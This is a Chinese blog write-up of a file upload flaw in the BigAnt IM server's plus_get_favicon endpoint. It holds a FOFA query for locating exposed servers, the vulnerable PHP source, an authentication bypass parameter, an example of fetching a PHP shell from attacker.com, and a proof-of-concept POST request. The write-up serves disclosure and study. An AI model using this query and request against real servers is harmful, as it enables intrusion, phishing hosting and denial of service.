---
title: "大蚂蚁 (BigAnt) 即时通讯系统 plus_get_favicon 任意文件上传漏洞"
source: https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html
asset_dir: assets/大蚂蚁-(bigant)-即时通讯系统-plus_get_favicon-任意文件上传漏洞
---

# 大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/2/24 13:16
* 354浏览
* [0评论](#comment)
* 30分钟阅读

深入探索

客户端

IM

服务器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 plus\_get\_favicon 接口存在任意文件写入/[上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，攻击者可以通过上传特制的 PHP 文件，执行恶意代码，实现服务器的远程控制，可能导致敏感信息泄露、数据篡改等危害。

短信和即时消息

# 影响版本

BigAnt 5.5.x 及以上版本用户

[![大蚂蚁 (BigAnt) 即时通讯系统 plus_get_favicon 任意文件上传漏洞](images/img-001-af66cd8e6523.webp)](https://image.mrxn.net/5623d2945cc347a388c16efc24905efc.webp)

经过测试，最新版本 6.0.1.20250407.1 也受影响

漏洞预警服务

深入探索

文件大小转换

SQL注入防护

防火墙软件

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"

# 漏洞分析

直接看下 Application/Admin/Controller/PlusController.class.php 的实现逻辑

[![大蚂蚁 (BigAnt) 即时通讯系统 plus_get_favicon 任意文件上传漏洞](images/img-002-064c377bb893.webp)](https://image.mrxn.net/b8622174d2b54a74a5654b3d2dba0519.webp)

最开始的初始化部分定义了如果**app\_id**=**pc\_clientz 那么就不需要鉴权.**

防病毒程序与恶意软件

深入探索

恶意软件分析工具

Web安全书籍

服务器安全服务

再看 `plus_get_favicon()` 方法的实现逻辑

```
public function plus_get_favicon(){

    $plus_uri = I("plus_uri");
    if(!$plus_uri){
       Jump::errror(3002,"not found the plus_uri");
    }
    // 得到 host
    $parse_url = parse_url($plus_uri);
    $newUrl = sprintf("%s://%s:%d", $parse_url['scheme'], $parse_url['host'], $parse_url['port']);
    $content = file_get_contents($newUrl);
    if(preg_match("/rel=\".*icon\".+href=\"(.*)\"/U", $content, $match) === false){
       Jump::errror(3002,"not found the preg_match");
    }
    if(empty($match[1])){
       Jump::errror(3002,"not found the \$match[1]");
    }
    $img_url = $match[1];

    $dir =\Common\Lib\SaasSDK::getStoragePath(sp_saas_id(),'plus_favicon') ;
    sp_folder_create(SITE_PATH.$dir);

    $ext= substr($img_url,strrpos($img_url,'.'));
    $filepath=$dir.md5($img_url).$ext;
    $file_get_contents = file_get_contents($newUrl.$img_url);
    file_put_contents(SITE_PATH.$filepath, $file_get_contents);
    $data['img_url']=$filepath;

    Jump::success($data);
}
```

首先用户通过 `plus_uri` 参数输入一个完全可控的 URL，然后进行处理：

计算机服务器

1. **URL 解析与重组：** 程序使用 `parse_url` 拆解输入，并用 `sprintf` 重新拼接成 `$newUrl`。
   1. *语义展开：* 如果用户输入 `http://attacker.com:80/exploit`，`$newUrl` 会被格式化为 `http://attacker.com:80`。注意这里强制要求了端口，如果用户不提供端口，`sprintf` 的 `%d` 可能会导致非预期的结果（如 0），但攻击者只需显式提供端口（如 :80）即可绕过。
2. **第一次 SSRF：** `file_get_contents($newUrl)` 发起请求，获取攻击者控制的页面内容 `$content`。
3. **正则提取：** `preg_match("/rel=\".*icon\".+href=\"(.*)\"/U", $content, $match)`。
   1. *语义展开：* 攻击者在自己的页面中准备如下内容：`<link rel="icon" href="/shell.php">`。正则会成功匹配，并将 `$match[1]` 赋值为 `/shell.php`。
4. **后缀名提取：** `$ext = substr($img_url, strrpos($img_url, '.'));`
   1. *语义展开：* `strrpos` 查找 `/shell.php` 中最后一个 `.` 的位置。`substr` 从该位置截取到末尾，结果为 `.php`。程序完全没有检查这个后缀是否合法（如是否为 jpg/png）。
5. **第二次 SSRF：** `$file_get_contents = file_get_contents($newUrl.$img_url);`
   1. *语义展开：* 服务器再次请求 `http://attacker.com:80/shell.php`，获取攻击者预设的 PHP 木马内容。

代码直接通过 `substr` 提取原始链接中的后缀，并直接拼接到本地文件名中，未做任何白名单限制，从而导致[任意文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞。

**但是由于Apache服务器配置中存在如下内容**

短信和即时消息

[![大蚂蚁 (BigAnt) 即时通讯系统 plus_get_favicon 任意文件上传漏洞](images/img-003-5b21b9cbe155.webp)](https://image.mrxn.net/cfac64c194aa4372a40c661ab671d2de.webp)

有针对data目录的**`php_admin_flag engine off`**配置，表示**data目录禁止解析php**,因此不能解析。但是可以上传html文件钓鱼或者作为恶意文件托管等、或者特别大的文件消耗磁盘容量造成因磁盘容量耗尽的DOS等危害，也是不容小觑。

# 漏洞复现

> 需要注意thinkphp的路由特性，不区分大小写，且还支持如下等方式
>
> 漏洞预警服务
>
> /api/dispersedOrg/plus\_get\_favicon.html
>
> /api/dispersedOrg/plus\_get\_favicon

[![大蚂蚁 (BigAnt) 即时通讯系统 plus_get_favicon 任意文件上传漏洞](images/img-004-e4b0608094c7.webp)](https://image.mrxn.net/25a37ebef700452382b881471350c6d8.webp)

在本地http服务的默认首页如 index.html 文件内容包含 `<link rel="icon" href="/del.php">` 这种可以通过正则校验以及测试文件del.php的内容。

网络

```
POST /?m=Admin&c=Plus&a=plus_get_favicon HTTP/1.1
Host: bigant.mrxn.net
Content-Type: application/x-www-form-urlencoded

plus_uri=http://127.0.0.1:80&app_id=pc_client
```

[![大蚂蚁 (BigAnt) 即时通讯系统 plus_get_favicon 任意文件上传漏洞](images/img-005-b87ba5a10ba4.webp)](https://image.mrxn.net/28f024f7934f491489636d8a9b420ed0.webp)

如上图所示，我们成功上传文件到`/data/plus_favicon/`目录下。

计算机服务器

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[大蚂蚁 (BigAnt) 即时通讯系统 plus\_get\_favicon 任意文件上传漏洞](https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html)  
文章链接：<https://mrxn.net/jswz/bigant-plus_get_favicon-upload.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/bigant-plus\_get\_favicon-upload.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

安全运维咨询

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALd0lEQVR4AeybgXbrNg5Ec/v//7yb0WQoEKJkJ5s+e1vlBBlgMIBoQnTkvPavj4+P//zU/tO+ap+kKves/53aaIW9v7hqPa84eflnFk3Hqk+ucj/xNZDPuvv7XXZgDORzwh/PWl888AF0eouf6bkJP39EC2z9Elf8lG3f4cBaYOP1o+fEdYvmjFe+5xIDh/UlF1T9s5Ya4RiIgttevwOHgYCnD0f8znLB9akBx7BjcrmTegyPtalZYfqC+yQWgjkwipOBY2DV8tscsJ0mOOKq2WEgK9HN/bkd+NWB6A7rBr4zrl4SWAPGlRacgxmrNteGWbPia90jH9yv68A80FM/jn91ID9exV04duClAwG299fcwcGsLnHF5FYI7pdc6nocviLMtapJXr4Mjhrxv2kvHchvvpB/Sq+/ZyD/lN15wes4DCTHdIW/sb5VX/BbAZxjv/aqT7iuBfetPBy5mpcP1qTvFUq/su/WHAayanpzf24HxkDAdwM8xmeWB+6TO2RVA2vNVU3vA+4B9NSP4lxb2BsA20NIeHAMhBoIbFp4jKPo0xkD+fTv7zfYgb90J/zUsv7UJxZ2LjHsd4x0MjAnv1pqhPBYU2tXPrgHMNLAdifrGrKRKA5YEwrmOLxQPf4Xu0+IdvGN7DAQOJ8+OAfPY14ruCaxsN9J4mRgLewovhrsOZj9qqt+vV7l5YN7yO9W6+QnLz8Gcz04hseYfsLDQETe9rod+AvmCfaJw57PMqMJrvhw4PrEqRGG66icrPPfjcHXVi/ZVb3ysqpRLKucfHEy+WemfLdoOw9eJ/Dx/3RCPv4NX/dA3mzK47G3r6sfK8XRwH7EgNATSr+ySfQVANuj51e4+cD0b/zJrXqecalZYa+BeQ21BuYczHHVdh+sBUYK2F7jIIpzn5CyGe/gHgYCnh4cMQvO3XUWi4e5XpwMZh4QvVnvu5HtB7DdXWCsaZi59IOZv6oBa2HHqq8+7Jpcq+a7H02w5xUfBiLyttftwHjszRIyvRVGA74zzmLxvR7mmmc04BpA8qUB48TkmmAuBZ0Hkpp+T0UXjOgsDi8ExjqAlE4IbJqJbMF9QtqGvDo8PGXB+RR1J6xs9SLAfcC40pxxV9dI7qz2ik+tELwuMKYOHMP+lAfmuiZxRfWWgWvkdwPnal38+4RkJ94E74G8ySCyjDGQHKskrhB85MCYWnAMnJZHKwS2X3JgFCcDx7CjeBmYk9+tXxSs7fxVXHuC68OlLjE4D/vbWzQrBOtXuXBjICFufO0OnD72ZlngqcKOuUOiCYav2HNw7BM9OJc4tUJwTv53DY61uUbwOz3B/VIrBHNgTD9wDIQaj9rA9g6h+th9QsY2vYczBgKeFhizvEyuIlgTDhynpmLXJBbCeZ16SBNTLOsxuAfsKJ0s2qC4GFh/Fodf4apfuI61PrnKyQevBbj/PeTjzb7GCTmb3mq9XZsY9kmD/V4P5mF/MgFzV32S6/1q3DXgvmCs2u732pqHuR7mWFqYOXCcvkIwB0ZxMtXHxkBC3PjaHTj86eSZ5YAnHC041rRjPZc4eWG4jsp1iwZ8LTBWHRw55Ve14YLgWtgxOfWQgXPyZcmvUHnZd3P3CVnt2P/O/bjDPZAfb93fUzg+GML6OIJ52FFHUZYlyZfBruk55WXhhWC9eBk4Vk4GjgGFk0kvq6RiGbB94AJjNMrFwsGsCV8RHmt639SDa4FQl3ifkMvt+fPJMZBMGFjeXXVpMGvAcXoIowfn4IhdozoZWCs/BuZ6DZiHHaNJbWI4apKLtmLPJYa9D1z7qbnCes0xkKuCO/fndmAMBDzpOi35dSmKV1Y1Z/